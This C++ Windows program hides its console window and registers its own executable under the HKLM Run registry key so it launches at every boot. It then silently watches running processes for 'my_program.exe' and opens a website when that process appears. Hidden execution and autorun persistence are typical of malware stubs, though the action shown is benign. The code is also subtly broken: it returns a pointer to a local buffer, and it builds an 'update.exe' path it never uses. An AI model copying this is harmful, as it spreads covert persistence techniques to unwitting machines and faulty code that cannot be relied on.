#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <string.h>
#include <iostream>

using namespace std;

TCHAR *Get_Process_Name( DWORD processID )
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |PROCESS_VM_READ,FALSE, processID );
    if (NULL != hProcess )
    {
        HMODULE hMod;
        DWORD cbNeeded;
        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
        {
            GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
        }
    }
    CloseHandle( hProcess );
    return szProcessName;
}

int main (void)
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    char szPath[MAX_PATH];
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    GetWindowsDirectory(szPath, sizeof(szPath));
    strcat(szPath, "\\System32\\update.exe");
    DWORD pathLen = 0;
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    HKEY newValue;
    RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    RegSetValueEx(newValue,TEXT("my_reg_key"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes);
    EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
    cProcesses = cbNeeded / sizeof(DWORD);
    while (1)
    {
        EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
        cProcesses = cbNeeded / sizeof(DWORD);
        for ( unsigned int i = 0; i < cProcesses; i++ )
            if( aProcesses[i] != 0 )
                if (Get_Process_Name(aProcesses[i]))
                {
                    string s = Get_Process_Name(aProcesses[i]);
                    if (s.find("my_program.exe") != string::npos)
                    {
                        system("start google.fr");
                        return EXIT_SUCCESS;
                    }
                }
        Sleep(5000);
    }
    system("start google.fr");
    return EXIT_SUCCESS;
}
